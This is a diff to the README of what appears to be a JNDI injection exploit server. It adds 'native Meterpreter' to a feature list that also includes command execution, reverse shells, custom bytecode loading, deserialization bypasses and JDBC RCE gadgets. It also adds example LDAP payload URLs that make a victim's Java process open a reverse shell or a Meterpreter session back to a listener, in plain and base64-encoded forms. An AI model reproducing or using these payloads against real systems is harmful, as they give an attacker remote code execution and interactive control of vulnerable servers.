@@ -9,6 +9,7 @@ Features
 - DNS Log
 - execute command
 - native reverse shell (Windows supported)
+- native Meterpreter
 - load custom class bytecode
 - Tomcat/Groovy/SnakeYaml/MVEL bypass
 - Commons DBCP/Tomcat DBCP/Tomcat JDBC/Alibaba Druid/HikariCP JDBC RCE
@@ -93,6 +94,10 @@ ldap://127.0.0.1:1389/Basic/FromFile/<base64-url-encoded-path-to-evil-class-file
 # native reverse shell (Windows supported)
 ldap://127.0.0.1:1389/Basic/ReverseShell/127.0.0.1/4444
 ldap://127.0.0.1:1389/Basic/ReverseShell/MTI3LjAuMC4x/NDQ0NA==
+
+# native Meterpreter (java/meterpreter/reverse_tcp)
+ldap://127.0.0.1:1389/Basic/Meterpreter/127.0.0.1/4444
+ldap://127.0.0.1:1389/Basic/Meterpreter/MTI3LjAuMC4x/NDQ0NA==
 ```
 
 ### Bypass
